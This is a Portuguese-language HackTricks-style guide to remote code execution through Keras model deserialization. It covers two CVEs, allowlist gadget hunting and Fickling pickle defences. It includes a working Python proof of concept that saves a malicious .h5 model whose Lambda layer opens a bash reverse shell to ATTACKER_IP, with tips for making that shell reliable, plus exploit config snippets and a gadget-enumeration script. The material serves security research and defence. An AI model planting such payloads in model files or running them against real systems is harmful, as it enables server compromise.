# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas práticas de exploração contra o pipeline de desserialização de modelos Keras, explica os internos do formato nativo .keras e a superfície de ataque, e fornece um toolkit para pesquisadores para encontrar Model File Vulnerabilities (MFVs) e post-fix gadgets.

## Internos do formato de modelo .keras

Um arquivo .keras é um arquivo ZIP que contém pelo menos:
- metadata.json – informações genéricas (por exemplo, Keras version)
- config.json – arquitetura do modelo (primary attack surface)
- model.weights.h5 – weights in HDF5

O config.json controla a desserialização recursiva: o Keras importa modules, resolve classes/functions e reconstrói layers/objects a partir de attacker-controlled dictionaries.

Exemplo de trecho para um objeto Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Desserialização realiza:
- Importação de módulos e resolução de símbolos a partir de chaves module/class_name
- from_config(...) ou invocação de construtor com kwargs controlados pelo atacante
- Recursão em objetos aninhados (ativações, inicializadores, restrições, etc.)

Historicamente, isso expôs três primitivas a um atacante que montasse config.json:
- Controle sobre quais módulos são importados
- Controle sobre quais classes/funções são resolvidas
- Controle dos kwargs passados para construtores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa raiz:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigação:
- Keras aplica safe_mode=True por padrão. Funções Python serializadas em Lambda são bloqueadas, a menos que o usuário opte explicitamente por desativar com safe_mode=False.

Notas:
- Formatos legados (arquivos HDF5 mais antigos) ou bases de código antigas podem não aplicar verificações modernas, então ataques do tipo “downgrade” ainda podem ser aplicáveis quando as vítimas usam carregadores mais antigos.

## CVE-2025-1550 – Importação arbitrária de módulos no Keras ≤ 3.8

Causa raiz:
- _retrieve_class_or_fn used unrestricted importlib.import_module() with attacker-controlled module strings from config.json.
- Impact: Arbitrary import of any installed module (or attacker-planted module on sys.path). Import-time code runs, then object construction occurs with attacker kwargs.

Ideia de exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Melhorias de segurança (Keras ≥ 3.9):
- Lista de módulos permitidos: importações restritas aos módulos oficiais do ecossistema: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro por padrão: safe_mode=True bloqueia o carregamento de funções serializadas Lambda inseguras
- Verificação básica de tipos: objetos desserializados devem corresponder aos tipos esperados

## Exploração prática: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Muitas stacks de produção ainda aceitam arquivos de modelo legados TensorFlow-Keras HDF5 (.h5). Se um atacante conseguir fazer upload de um modelo que o servidor mais tarde carrega ou utiliza para inferência, uma camada Lambda pode executar Python arbitrário ao carregar/build/predict.

PoC mínimo para criar um .h5 malicioso que executa um reverse shell quando desserializado ou usado:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas e dicas de confiabilidade:
- Pontos de disparo: o código pode ser executado várias vezes (por exemplo, durante layer build/first call, model.load_model, e predict/fit). Faça com que os payloads sejam idempotent.
- Fixação de versão: alinhe o TF/Keras/Python da vítima para evitar incompatibilidades de serialização. Por exemplo, build artifacts under Python 3.8 with TensorFlow 2.13.1 if that’s what the target uses.
- Replicação rápida do ambiente:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validação: um payload benigno como os.system("ping -c 1 YOUR_IP") ajuda a confirmar a execução (por exemplo, observar ICMP com tcpdump) antes de trocar para um reverse shell.

## Superfície de gadgets pós-fix dentro da allowlist

Mesmo com allowlisting e safe mode, uma superfície ampla permanece entre os callables permitidos do Keras. Por exemplo, keras.utils.get_file pode baixar URLs arbitrárias para locais selecionáveis pelo usuário.

Gadget via Lambda que referencia uma função permitida (não serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitação importante:
- Lambda.call() insere o tensor de entrada como o primeiro argumento posicional ao invocar o callable alvo. Os gadgets escolhidos devem tolerar um argumento posicional extra (ou aceitar *args/**kwargs). Isso restringe quais funções são viáveis.

## ML pickle import allowlisting for AI/ML models (Fickling)

Muitos formatos de modelos AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artefatos antigos do TensorFlow, etc.) embutem dados Python pickle. Ataquantes rotineiramente abusam de GLOBAL imports do pickle e de construtores de objetos para alcançar RCE ou troca de modelo durante o carregamento. Scanners baseados em blacklist frequentemente deixam passar imports perigosos novos ou não listados.

Uma defesa prática fail-closed é interceptar o desserializador do pickle do Python e só permitir um conjunto revisado de imports relacionados a ML considerados inofensivos durante o unpickling. Trail of Bits’ Fickling implementa essa política e fornece uma allowlist de imports ML curada, construída a partir de milhares de pickles públicos do Hugging Face.

Modelo de segurança para imports “seguros” (intuições destiladas de pesquisa e prática): símbolos importados usados por um pickle devem simultaneamente:
- Não executar código nem causar execução (sem objetos de código compilado/fonte, shelling out, hooks, etc.)
- Não obter/definir atributos ou itens arbitrários
- Não importar ou obter referências a outros objetos Python a partir da VM do pickle
- Não acionar quaisquer desserializadores secundários (por exemplo, marshal, nested pickle), mesmo indiretamente

Habilite as proteções do Fickling o mais cedo possível na inicialização do processo, para que quaisquer carregamentos de pickle realizados por frameworks (torch.load, joblib.load, etc.) sejam verificados:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Dicas operacionais:
- Você pode desativar temporariamente/reativar os hooks onde necessário:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se um modelo conhecido e confiável for bloqueado, estenda a allowlist para o seu ambiente após revisar os símbolos:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling também expõe proteções genéricas em runtime se você preferir controle mais granular:
- fickling.always_check_safety() para aplicar verificações para todo pickle.load()
- with fickling.check_safety(): para aplicação com escopo
- fickling.load(path) / fickling.is_likely_safe(path) para verificações pontuais

- Prefira formatos de modelo não-pickle quando possível (p.ex., SafeTensors). Se precisar aceitar pickle, execute os loaders com privilégio mínimo, sem saída de rede, e aplique a allowlist.

Essa estratégia allowlist-first bloqueia demonstravelmente caminhos comuns de exploração de pickle em ML mantendo alta compatibilidade. No benchmark do ToB, Fickling sinalizou 100% dos arquivos sintéticos maliciosos e permitiu ~99% dos arquivos limpos dos principais repositórios Hugging Face.


## Kit do pesquisador

1) Descoberta sistemática de gadgets em módulos permitidos

Enumerar callables candidatos em keras, keras_nlp, keras_cv, keras_hub e priorizar aqueles com efeitos colaterais em arquivo/rede/processo/variáveis de ambiente.

<details>
<summary>Enumerar callables potencialmente perigosos em módulos Keras allowlisted</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Teste direto de deserialização (não é necessário um arquivo .keras)

Alimente dicts criados diretamente nos deserializers do Keras para descobrir os params aceitos e observar efeitos colaterais.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondagem entre versões e formatos

Keras existe em múltiplas bases de código/eras com diferentes salvaguardas e formatos:
- Keras integrado do TensorFlow: tensorflow/python/keras (legado, previsto para remoção)
- tf-keras: mantido separadamente
- Keras 3 multi-backend (oficial): introduziu .keras nativo

Repita os testes em todas as bases de código e formatos (.keras vs HDF5 legado) para descobrir regressões ou medidas de proteção ausentes.

## Referências

- [Caçando Vulnerabilidades na Desserialização de Modelos Keras (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Adicionou verificações à serialização](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda desserialização RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – importação arbitrária de módulos Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [relatório huntr – importação arbitrária #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [relatório huntr – importação arbitrária #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE até root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – novo scanner de arquivos pickle AI/ML do Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Protegendo ambientes AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Corpus de benchmark de varredura de pickle do Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Contexto dos ataques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [Projeto SafeTensors](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
